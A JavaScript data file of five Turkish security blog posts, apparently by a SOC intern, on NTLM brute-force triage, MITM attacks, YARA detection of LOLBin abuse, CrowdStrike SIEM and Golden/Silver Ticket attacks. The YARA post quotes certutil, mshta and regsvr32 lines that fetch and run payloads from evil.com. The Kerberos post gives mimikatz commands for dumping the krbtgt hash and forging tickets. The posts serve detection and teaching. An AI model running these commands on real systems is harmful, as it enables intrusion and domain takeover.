const posts = [

  {
    id: "alert-ntlm-bruteforce",
    title: "Alert Analizi #1 — İç Ağda NTLM Brute Force Tespiti",
    date: "14 Ekim 2026",
    excerpt: "Kurumsal ağda bir servis hesabından 58 saniye içinde 145 başarısız NTLM kimlik doğrulama denemesi. Cortex XDR alarmını nasıl analiz ettik, ne bulduk, ne öğrendik.",
    tags: ["Incident Response", "SOC Operations", "Active Directory"],
    severity: "high",
    body: `
    <h2>Arka Plan</h2>
    <p>Bu yazı, staj sürecimde karşılaştığım ve analiz ettiğim gerçek bir Cortex XDR alert'ine dayanmaktadır. Şirket ve kullanıcı bilgileri anonimleştirilmiştir. Amacım hem kendi öğrenme sürecimi belgelemek hem de benzer bir alert'le karşılaşacak kişilere bir referans noktası sunmak.</p>

    <h2>Alert Özeti</h2>
    <p>Cortex XDR, iç ağda bir sunucu hesabından kaynaklanan yoğun NTLM kimlik doğrulama başarısızlıkları tespit etti. Alert detayları:</p>
    <ul>
      <li><strong>Kaynak hesap:</strong> Bir domain servis hesabı (domain\servisHesabi)</li>
      <li><strong>Hedef:</strong> Dosya sunucusu (FILESERVER01)</li>
      <li><strong>Süre:</strong> 58 saniye</li>
      <li><strong>Deneme sayısı:</strong> 145 başarısız NTLM authentication</li>
      <li><strong>MITRE ATT&CK:</strong> TA0006 (Credential Access) / T1110 (Brute Force)</li>
    </ul>

    <h2>İlk Değerlendirme: Gerçek mi, False Positive mi?</h2>
    <p>İlk soru her zaman şu olmalı: <em>Bu bir saldırı mı, yoksa meşru bir uygulamanın yanlış davranışı mı?</em></p>
    <p>145 deneme / 58 saniye = saniyede yaklaşık 2.5 istek. Bu oran insan eliyle yapılabilecek bir şey değil, ama aynı zamanda özellikle agresif bir brute force aracının da altında kalıyor. Otomatik bir script veya yanlış yapılandırılmış bir servis olabilir.</p>
    <p>Kaynak hesabın bir <strong>servis hesabı</strong> olması dikkat çekici. Servis hesapları normalde belirli kaynaklarla konuşur ve başarısız auth denemeleri üretmez. Eğer gerçekten compromise edilmişse, saldırgan bu hesabı lateral movement için kullanıyor olabilir.</p>

    <h2>NTLM Neden Önemli?</h2>
    <p>NTLM (NT LAN Manager), Microsoft'un eski kimlik doğrulama protokolüdür. Kerberos'un aksine bir challenge-response mekanizması kullanır ve bu yapı onu birkaç saldırı vektörüne açık kılar:</p>
    <ul>
      <li><strong>Pass-the-Hash:</strong> Parola yerine hash kullanılarak kimlik doğrulama yapılabilir</li>
      <li><strong>NTLM Relay:</strong> Authentication trafiği yakalanıp başka bir hedefe yönlendirilebilir</li>
      <li><strong>Brute Force:</strong> Hash değerleri offline kırılabilir veya online deneme yapılabilir</li>
    </ul>
    <p>Modern ortamlarda Kerberos tercih edilmeli ve NTLM devre dışı bırakılmalı veya kısıtlanmalıdır. Ama çoğu kurumsal ağda NTLM hâlâ aktif — çünkü eski sistemler, legacy uygulamalar veya yanlış yapılandırmalar buna ihtiyaç duyuyor.</p>

    <h2>Analiz Adımları</h2>
    <p>Alert'i aldıktan sonra izlediğim adımlar:</p>

    <h3>1. Zaman çizelgesini incele</h3>
    <p>145 deneme tam olarak hangi zaman aralığına sığıyor? Başlangıç ve bitiş saati önemli. Mesai saatleri dışında mı olmuş? Gece 3'te başlayan bir brute force ile sabah 9'da başlayan biri farklı risk profillerine sahip.</p>

    <h3>2. Kaynak hesabı sorgula</h3>
    <p>Hesap son ne zaman kullanılmış? Normal davranış profili nedir? Başka sistemlere de benzer denemeler yapmış mı? Active Directory logları ve SIEM'deki geçmiş eventlar burada kritik.</p>

    <h3>3. Hedef sistemi değerlendir</h3>
    <p>FILESERVER01, yüksek değerli bir hedef. Üzerinde ne tür veriler var? Başarılı bir kimlik doğrulama olmuş mu (sonrasında)? Eğer brute force başarılı olduysa ve ardından dosya erişimi varsa, bu artık Credential Access + Collection kombinasyonu demektir.</p>

    <h3>4. Ağ trafiğini kontrol et</h3>
    <p>Kaynak IP'den başka nereye trafik gidiyordu? Lateral movement'ın en belirgin işareti, bir makinenin normalde iletişim kurmadığı sistemlerle aniden konuşmaya başlamasıdır.</p>

    <h2>Behavioral Baseline: Normalin Dışına Çıkmak</h2>
    <p>Güvenlik analizinin temel sorusu şu: <em>Bu sistem normalde böyle mi davranır?</em></p>
    <p>Bir servis hesabı normalde önceden tanımlanmış kaynaklara, belirli portlara ve protokollere ihtiyaç duyar. Behavioral baseline olmadan bu soruyu cevaplayamazsınız. İyi bir SIEM kurulumunda her hesabın "normal" trafiği zaman içinde öğrenilir ve sapmalar otomatik olarak flaglenir.</p>
    <p>Bu case'de servis hesabının FILESERVER01'e NTLM ile bağlanması alışılmadık bir durumdu — normalde bu hesap farklı bir protokol ve farklı bir hedef kullanıyordu. Bu sapma alert'i tetikledi.</p>

    <h2>Sonuç ve Öğrenilen Dersler</h2>
    <p>Bu alert'in analizi birkaç önemli dersi beraberinde getirdi:</p>
    <ul>
      <li>Servis hesapları düzenli olarak denetlenmeli, minimum yetki prensibiyle çalışmalı</li>
      <li>NTLM kullanımı ortamda loglanmalı ve anormallikler için alarm kurulmalı</li>
      <li>Lateral movement tespiti için hem kaynak hem hedef tarafında log korelasyonu şart</li>
      <li>False positive ile gerçek tehdit arasındaki fark çoğu zaman context'te gizli: hesabın geçmiş davranışı, hedef sistemin değeri, olay zamanlaması</li>
    </ul>
    <p>Her alert bir hikaye anlatır. Görevi analisti, o hikayenin ne anlama geldiğini çözmektir.</p>
  `
  },

  {
    id: "MITM",
    title: "Görünmeyen Üçüncü Kişi Man-in-the-Middle (MITM) Saldırıları",
    date: "13 Ocak 2026",
    excerpt: "MITM saldırılarının gerçekleşme kriterleri, saldırı türleri, tespit yöntemleri ve alınabilecek önlemler üzerine bir inceleme.",
    tags: ["Network Security", "Blue Team"],
    severity: "medium",
    body: `
    <img src="images/MITM.png" alt="MITM saldırı diyagramı" style="width:100%; background:#ffffff; padding:24px; border-radius:12px; margin:0 0 20px; display:block;">

    <h2>1. Giriş</h2>
    <p>Man-in-the-Middle (MITM) saldırıları, saldırganın iki taraf arasındaki iletişime gizlice dahil olarak veri dinlemesi, değiştirmesi veya yönlendirmesi esasına dayanan siber saldırı türleridir. Bu saldırılar genellikle ağ güvenliğindeki zayıflıklardan, yanlış yapılandırmalardan ve kullanıcı farkındalığı eksikliğinden faydalanılarak gerçekleştirilir.</p>
    <p>Bu bölümde MITM saldırılarının hangi kriterlere göre yapıldığı, kullanılan yöntemler, gerçekçi saldırı senaryoları ve SOC tarafında bu saldırıların nasıl tespit edilebileceği ele alınmıştır.</p>

    <h2>2. MITM Saldırılarının Gerçekleşme Kriterleri</h2>

    <h3>2.1 Ağ Konumuna Göre (Network Position)</h3>
    <p>MITM saldırılarının en temel gereksinimi, saldırganın hedef ile iletişim kurulan ağ arasında yer alabilmesidir. Bu durum genellikle aynı yerel ağda (LAN) bulunan sistemlerde görülür.</p>
    <p><strong>Örnek Senaryo:</strong> Bir yurt veya kafe ortamında kullanıcı ve saldırgan aynı Wi-Fi ağına bağlıdır. Saldırgan ARP Spoofing yöntemi ile kendisini gateway gibi göstererek trafiği kendi üzerinden geçirir.</p>
    <p><strong>Evil Twin / Sahte Erişim Noktası (Rogue AP):</strong> Saldırganın aynı ağa sızmasına dahi gerek kalmayabilir. Meşru bir Wi-Fi ağının SSID'sini birebir taklit eden sahte bir erişim noktası kurarak kullanıcıların bilmeden kendi cihazına bağlanmasını sağlayabilir.</p>

    <h3>2.2 Kullanılan Protokole Göre</h3>
    <p>Kullanılan ağ protokolünün şifreli olup olmaması MITM saldırısının başarısını doğrudan etkiler.</p>
    <p><strong>Şifrelenmemiş Protokoller:</strong></p>
    <ul>
      <li>HTTP</li>
      <li>FTP</li>
      <li>Telnet</li>
      <li>POP3</li>
    </ul>
    <p><strong>Şifreli Ancak Zayıf Yapılandırılmış Protokoller:</strong></p>
    <ul>
      <li>HTTPS (SSL Stripping)</li>
      <li>SSH — asıl risk, host key doğrulamasının kullanıcı tarafından düşünmeden kabul edilmesinden kaynaklanır.</li>
    </ul>

    <h3>2.3 Altyapı Servislerine Göre</h3>
    <p>MITM saldırıları yalnızca uygulama katmanında değil, ağ altyapısında çalışan servisler hedef alınarak da gerçekleştirilebilir.</p>
    <ul>
      <li>ARP Spoofing</li>
      <li>DNS Spoofing</li>
      <li>DHCP Spoofing</li>
      <li>ICMP Redirect</li>
      <li>LLMNR / NBT-NS Poisoning</li>
    </ul>

    <h3>2.4 Kullanıcı Davranışlarına Göre</h3>
    <ul>
      <li>HTTPS sertifika uyarılarının dikkate alınmaması</li>
      <li>Halka açık Wi-Fi ağlarının kullanılması</li>
      <li>VPN kullanılmaması</li>
      <li>Sahte sertifikaların kabul edilmesi</li>
    </ul>

    <h2>3. MITM Saldırı Türleri</h2>

    <h3>3.1 Ağ Seviyesi MITM</h3>
    <ul>
      <li>ARP Poisoning</li>
      <li>DHCP Spoofing</li>
      <li>DNS Spoofing / LLMNR-NBT-NS Poisoning</li>
    </ul>

    <h3>3.2 Taşıma Seviyesi MITM</h3>
    <ul>
      <li>TCP Session Hijacking</li>
      <li>SSL Stripping</li>
    </ul>

    <h3>3.3 Uygulama Seviyesi MITM</h3>
    <ul>
      <li>Sahte giriş sayfaları</li>
      <li>HTTPS'den HTTP'ye düşürme (Downgrade Attack)</li>
      <li>Evil Twin / Sahte Erişim Noktası</li>
    </ul>

    <h2>4. MITM Saldırı Senaryosu Örneği</h2>
    <p>Bir kullanıcı halka açık bir Wi-Fi ağı üzerinden HTTP protokolü kullanan bir web sitesine giriş yapar. Aynı ağda bulunan saldırgan ARP Spoofing yöntemiyle trafiği dinler ve kullanıcının oturum bilgilerini ele geçirir.</p>

    <h2>5. Tespit (Detection) Perspektifi</h2>
    <p>MITM saldırıları önleme kadar tespit açısından da önemlidir. SOC tarafında dikkat edilmesi gereken bazı göstergeler:</p>
    <ul>
      <li>Aynı IP adresine kısa sürede birden fazla farklı MAC adresi eşlenmesi</li>
      <li>Gateway MAC adresinde ani ve açıklanamayan değişiklikler</li>
      <li>Ağda beklenmedik, yetkisiz DHCP sunucu yanıtları</li>
      <li>Yoğun LLMNR/NBT-NS trafiği veya bilinen saldırı araçlarına ait imzalar (ör. Responder)</li>
      <li>Sertifika uyuşmazlıkları veya beklenmedik self-signed sertifika kullanımı</li>
      <li>Aynı ağda birden fazla SSID'nin aynı isimle yayın yapması (Evil Twin göstergesi)</li>
    </ul>

    <h2>6. MITM Saldırılarına Karşı Önlemler</h2>
    <ul>
      <li>HTTPS ve HSTS kullanımı</li>
      <li>VPN ile ağ trafiğinin şifrelenmesi</li>
      <li>ARP ve DHCP koruma mekanizmaları (Dynamic ARP Inspection, DHCP Snooping)</li>
      <li>Sertifika doğrulama kontrolleri ve Certificate Pinning</li>
      <li>Güçlü parola ve anahtar politikaları</li>
      <li>802.1X / Network Access Control (NAC) ile yetkisiz cihazların ağa erişiminin engellenmesi</li>
      <li>DNSSEC kullanımı</li>
    </ul>

    <h2>7. Sonuç</h2>
    <p>MITM saldırıları, ağ güvenliği açısından ciddi riskler oluşturmaktadır. Güvenli yapılandırmalar, doğru tespit mekanizmaları ve kullanıcı farkındalığı, MITM saldırılarına karşı en etkili savunma yöntemidir.</p>
  `
  },

  {
    id: "yara-threat-detection",
    title: "YARA ile Tehdit Tespiti: LOLBin Kötüye Kullanımını Yakalamak",
    date: "16 Temmuz 2026",
    excerpt: "certutil, mshta, regsvr32 gibi meşru Windows araçlarının kötüye kullanımını tespit eden YARA kuralları nasıl yazılır?",
    tags: ["YARA", "Detection Engineering", "Threat Detection"],
    severity: "high",
    body: `
    <h2>LOLBin Nedir?</h2>
    <p>Living Off the Land Binaries (LOLBin), Windows işletim sistemiyle birlikte gelen meşru sistem araçlarının saldırganlar tarafından kötü amaçlı faaliyetler için kullanılmasını ifade eder. Bu araçlar işletim sisteminin parçası olduğundan antivirüs çözümleri tarafından genellikle güvenilir kabul edilir.</p>

    <h2>Neden YARA?</h2>
    <p>YARA, dosya ve bellek içeriğinde pattern eşleştirmesi yapan bir kural motorudur. Hash tabanlı tespitlerin aksine, YARA <strong>davranışsal ve yapısal özelliklere</strong> odaklanır. Bu sayede:</p>
    <ul>
      <li>Hash değişse bile aynı tekniği kullanan varyantlar yakalanabilir</li>
      <li>Obfuscation tekniklerine karşı daha dayanıklıdır</li>
      <li>Özel ortamınıza özgü kurallar yazabilirsiniz</li>
    </ul>

    <h2>certutil.exe — T1140 / T1105</h2>
    <p>certutil, sertifika yönetimi için kullanılan bir Windows aracıdır. Saldırganlar tarafından dosya indirme ve encoding/decoding işlemleri için sıklıkla kötüye kullanılır.</p>
    <pre><code>certutil -urlcache -split -f http://evil.com/payload.exe payload.exe
certutil -decode encoded.txt payload.exe</code></pre>
    <pre><code>rule Detect_Certutil_Abuse_T1140_T1105 {
    meta:
        description = "certutil.exe LOLBin kotu amacli kullanim tespiti"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1140, T1105"
        severity    = "High"
    strings:
        $certutil = "certutil"  ascii nocase
        $urlcache = "-urlcache" ascii nocase
        $decode   = "-decode"   ascii nocase
        $encode   = "-encode"   ascii nocase
        $split    = "-split"    ascii nocase
        $http     = "http://"   ascii
        $https    = "https://"  ascii
        $force    = "-f "       ascii nocase
    condition:
        $certutil and
        (($urlcache and ($http or $https)) or
         ($decode and $force) or
         ($encode and $split))
}</code></pre>
    <p><strong>Kural mantığı:</strong> <code>certutil</code> tek başına yeterli değil. <code>certutil</code> + <code>-urlcache</code> + URL görürsek şüpheli. <code>nocase</code> flag'i önemli: büyük/küçük harf varyasyonlarını yakalar.</p>

    <h2>mshta.exe — T1218.005</h2>
    <p>mshta.exe, HTA dosyalarını çalıştıran meşru bir Windows aracıdır. Browser güvenlik ayarlarını bypass eder, diske hiç dosya yazmadan uzaktan kod çalıştırabilir.</p>
    <pre><code>mshta.exe http://evil.com/payload.hta
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run(""malware.exe"")")</code></pre>
    <pre><code>rule Detect_Mshta_Abuse_T1218_005 {
    meta:
        description = "mshta.exe LOLBin / HTA kotu amacli kullanim tespiti"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1218.005"
        severity    = "High"
    strings:
        $mshta      = "mshta"          ascii nocase
        $http       = "http://"        ascii
        $https      = "https://"       ascii
        $vbscript   = "vbscript:"      ascii nocase
        $jscript    = "javascript:"    ascii nocase
        $wshell     = "WScript.Shell"  ascii nocase
        $activex    = "ActiveXObject"  ascii nocase
        $powershell = "powershell"     ascii nocase
        $resize     = "resizeTo"       ascii
    condition:
        ($mshta and any of ($http,$https,$vbscript,$jscript)) or
        ($wshell and $activex and $powershell) or
        ($resize and $mshta)
}</code></pre>

    <h2>regsvr32.exe — T1218.010 (Squiblydoo)</h2>
    <p>Squiblydoo, Casey Smith tarafından 2016'da keşfedilen bir AppLocker bypass tekniğidir. <code>/i:</code> parametresi bir URL alınca <code>scrobj.dll</code> o URL'deki <code>.sct</code> scriptlet dosyasını indirip çalıştırıyor. Diske hiçbir şey yazılmıyor.</p>
    <pre><code>regsvr32 /s /u /i:http://evil.com/file.sct scrobj.dll</code></pre>
    <pre><code>rule Detect_Regsvr32_Squiblydoo_T1218_010 {
    meta:
        description = "regsvr32 Squiblydoo / SCT scriptlet tespiti"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1218.010"
        severity    = "High"
    strings:
        $regsvr32 = "regsvr32"       ascii nocase
        $scrobj   = "scrobj.dll"     ascii nocase
        $sct_tag  = "&lt;scriptlet&gt;"    ascii nocase
        $reg_tag  = "&lt;registration"  ascii nocase
        $http_i   = "/i:http"        ascii nocase
        $https_i  = "/i:https"       ascii nocase
        $jscript  = "JScript"        ascii
        $vbscript = "VBScript"       ascii
        $wshell   = "WScript.Shell"  ascii nocase
    condition:
        ($regsvr32 and $scrobj and any of ($http_i,$https_i)) or
        ($sct_tag and $reg_tag and any of ($jscript,$vbscript,$wshell))
}</code></pre>

    <h2>YARA Kurallarını Çalıştırmak</h2>
    <pre><code>yara kural.yar hedef_dosya.sh       # tek dosya
yara -r kural.yar /tmp/             # recursive dizin taraması
yara -s kural.yar hedef.exe         # eşleşen string'leri göster</code></pre>

    <h2>Sonuç</h2>
    <p>İyi bir YARA kuralı şu soruya cevap verir: <em>Bu tekniğin değişmeyecek olan bileşeni nedir?</em></p>
    <p>Condition kombinasyonları ise false positive ile false negative arasındaki dengeyi kuruyor. Çok geniş yazarsanız alarm gürültüsüne boğulursunuz. Çok dar yazarsanız gerçek tehditler gözden kaçar.</p>
  `
  },

  {
    id: "crowdstrike-siem",
    title: "CrowdStrike Next-Gen SIEM ile Tehdit Avı",
    date: "2 Temmuz 2026",
    excerpt: "CrowdStrike Next-Gen SIEM'in dashboard yapısı, EventSearch motoru, detection kuralları ve Falcon platformuyla entegrasyonu üzerine bir deep-dive.",
    tags: ["CrowdStrike", "SIEM", "Threat Detection"],
    severity: "medium",
    body: `
    <h2>Giriş</h2>
    <p>CrowdStrike Next-Gen SIEM, Falcon platformunun bütünleşik bir parçası olarak konumlandırılmış modern bir SIEM çözümüdür. Geleneksel SIEM'lerin aksine, ajanlı veri toplama yerine Falcon sensörlerinden gelen telemetriyi doğrudan kullanır.</p>
    <p>Bu yazıda platformun temel bileşenlerini, EventSearch motorunu ve detection kurallarını inceleyeceğiz.</p>

    <h2>Mimari: Neden "Next-Gen"?</h2>
    <p>Geleneksel SIEM'ler log toplama, normalleştirme ve kural motoru olmak üzere birbirinden ayrı katmanlardan oluşur. Bu yaklaşımın sorunları:</p>
    <ul>
      <li>Yüksek log hacminde ciddi performans sorunları</li>
      <li>Log kalitesi ve normalleştirme tutarsızlıkları</li>
      <li>Uzun detection-to-alert süreleri</li>
    </ul>
    <p>CrowdStrike'ın yaklaşımı farklı: sensör zaten endpoint'te çalışıyor, telemetri zaten yapılandırılmış geliyor. SIEM katmanı bu veriyi depolamak ve aramak için optimize edilmiş.</p>

    <h2>EventSearch: Temel Sorgu Motoru</h2>
    <p>EventSearch, Splunk'ın SPL'sine benzer bir sorgu dili kullanır. Temel yapı:</p>
    <pre><code>#event_simpleName=ProcessRollup2
| where FileName="powershell.exe"
| where CommandLine contains "-EncodedCommand"
| table ComputerName, UserName, CommandLine, timestamp</code></pre>
    <p>Bu sorgu, base64 encoded komut çalıştıran PowerShell işlemlerini listeler. <code>ProcessRollup2</code> eventi, Falcon sensörünün her process başlatıldığında gönderdiği standart telemetri eventidir.</p>

    <h2>Detection Kuralları</h2>
    <p>Next-Gen SIEM'de iki tür detection mekanizması var:</p>

    <h3>1. Hazır (Out-of-the-Box) Kurallar</h3>
    <p>CrowdStrike'ın kendi tehdit istihbaratına dayanan, sürekli güncellenen kurallar. Bunlar otomatik olarak aktif gelir ve Falcon Intelligence ile beslenir.</p>

    <h3>2. Özel (Custom) Kurallar</h3>
    <p>Ortamınıza özgü detection mantığı yazabileceğiniz alan. Örnek: belirli bir servis hesabının mesai saatleri dışında işlem başlatması gibi behavioral kurallar.</p>

    <h2>Falcon Platformuyla Entegrasyon</h2>
    <p>Next-Gen SIEM'in en büyük avantajı, Falcon ekosistemiyle sıkı entegrasyonu:</p>
    <ul>
      <li><strong>Real-time Response:</strong> Alert'ten doğrudan endpoint'e bağlanıp inceleme yapabilirsiniz</li>
      <li><strong>Threat Graph:</strong> Olaylar arasındaki ilişkileri görsel olarak keşfedebilirsiniz</li>
      <li><strong>Fusion SOAR:</strong> Alert'leri otomatik workflow'lara bağlayabilirsiniz</li>
    </ul>

    <h2>Sonuç</h2>
    <p>CrowdStrike Next-Gen SIEM, geleneksel SIEM sorunlarının önemli bir kısmını çözüyor. Ancak vendor lock-in ve yüksek lisans maliyeti değerlendirme sürecinde göz ardı edilmemeli.</p>
  `
  },

  {
    id: "golden-silver-ticket",
    title: "Golden Ticket & Silver Ticket Saldırıları",
    date: "15 Haziran 2026",
    excerpt: "Kerberos protokolünün zafiyetlerini kullanan Golden ve Silver Ticket saldırılarının teknik analizi, tespit yöntemleri ve savunma stratejileri.",
    tags: ["Kerberos", "Active Directory", "Red Team Operations"],
    severity: "critical",
    body: `
    <h2>Kerberos'a Giriş</h2>
    <p>Kerberos, Windows Active Directory ortamlarında kullanılan standart kimlik doğrulama protokolüdür. Ticket tabanlı bir sistemdir: kullanıcı bir kez kimliğini doğrular, sonrasında servislere erişmek için bu ticket'ları kullanır.</p>
    <p>Kerberos'un üç temel bileşeni:</p>
    <ul>
      <li><strong>KDC (Key Distribution Center):</strong> Domain Controller üzerinde çalışır, ticket'ları düzenler</li>
      <li><strong>TGT (Ticket Granting Ticket):</strong> Kullanıcının kimliğini kanıtlayan ilk ticket</li>
      <li><strong>ST (Service Ticket):</strong> Belirli bir servise erişim için kullanılan ticket</li>
    </ul>

    <h2>Golden Ticket Saldırısı</h2>
    <p>Golden Ticket, KRBTGT hesabının NTLM hash'ini ele geçirerek keyfi TGT oluşturma saldırısıdır. KRBTGT, tüm TGT'leri imzalayan hesaptır — bu hash'e sahip olan, istediği kullanıcı adına, istediği yetkiyle ticket üretebilir.</p>

    <h3>Saldırı Adımları</h3>
    <ul>
      <li>Domain Admin yetkisi ele geçirilir (veya DCSync hakkı)</li>
      <li>KRBTGT hash'i dump edilir: <code>mimikatz lsadump::dcsync /user:krbtgt</code></li>
      <li>Sahte TGT oluşturulur: <code>mimikatz kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:[hash] /ticket:golden.kirbi</code></li>
      <li>Ticket kullanıma alınır: <code>kerberos::ptt golden.kirbi</code></li>
    </ul>

    <h3>Neden Tehlikeli?</h3>
    <p>KRBTGT parolası değiştirilmeden Golden Ticket geçerliliğini korur (varsayılan olarak 10 yıl). Hatta hesap silinse bile, domain SID aynı kaldığı sürece ticket çalışmaya devam edebilir.</p>

    <h2>Silver Ticket Saldırısı</h2>
    <p>Silver Ticket, KRBTGT yerine <strong>belirli bir servisin</strong> hesap hash'ini kullanır. Bu servis için doğrudan Service Ticket oluşturulur — KDC'ye hiç başvurulmaz.</p>

    <h3>Farklar</h3>
    <ul>
      <li><strong>Golden Ticket:</strong> KRBTGT hash → her servise erişim, KDC log'ları oluşur</li>
      <li><strong>Silver Ticket:</strong> Servis hash'i → sadece o servise erişim, KDC log'u oluşmaz (daha sessiz)</li>
    </ul>

    <h2>Tespit Yöntemleri</h2>
    <p>Her iki saldırı da dikkatli log analizi ile tespit edilebilir:</p>
    <ul>
      <li><strong>Event ID 4769</strong> (Service Ticket isteği) — encryption type 0x17 (RC4) modern ortamlarda şüpheli</li>
      <li><strong>Event ID 4672</strong> — beklenmedik hesaplarda özel yetki ataması</li>
      <li>Silver Ticket için: servis hesabının normalde görmediği sistemlerden gelen erişimler</li>
      <li>Mimikatz imzaları — EDR çözümleri genellikle LSASS erişimini flagler</li>
    </ul>

    <h2>Savunma Stratejileri</h2>
    <ul>
      <li>KRBTGT parolasını düzenli aralıklarla <strong>iki kez</strong> değiştirin (önbellek süresi nedeniyle)</li>
      <li>Privileged Access Workstation (PAW) kullanımı</li>
      <li>LAPS ile yerel admin parolalarını randomize edin</li>
      <li>Microsoft ATA veya Defender for Identity ile anomali tespiti</li>
      <li>RC4 encryption'ı devre dışı bırakarak sadece AES kullanın</li>
    </ul>

    <h2>Sonuç</h2>
    <p>Golden ve Silver Ticket saldırıları, Active Directory güvenliğinin neden sürekli izlenmesi gerektiğini gösteriyor. Tek bir hash sızıntısı, tüm domain'in kalıcı olarak tehlike altına girmesine yol açabilir.</p>
  `
  }

];
